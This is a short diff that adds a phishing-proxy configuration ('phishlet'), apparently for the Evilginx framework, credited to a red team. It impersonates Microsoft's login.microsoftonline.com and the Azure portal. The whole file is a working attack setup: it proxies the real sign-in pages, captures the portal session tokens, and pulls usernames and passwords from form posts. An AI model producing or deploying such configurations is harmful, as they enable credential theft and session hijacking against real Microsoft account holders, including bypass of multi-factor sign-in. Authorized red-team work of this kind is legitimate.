@@ -1,0 +1,29 @@
+name: 'azure'
+author: 'biredteam'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'portal', orig_sub: 'portal', domain: 'azure.com', session: true, is_landing:false}
+sub_filters: []
+auth_tokens:
+  - domain: '.portal.azure.com'
+    keys: ['portalId','browserId','headerId']
+auth_urls:
+  - '/common/SAS/ProcessAuth'
+credentials:
+  username:
+    key: '(login|UserName)'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '(passwd|Password)'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'html'
+      search: '(.*)'
+      type: 'json'
+login:
+  domain: 'portal.azure.com'
+  path: '/'
+
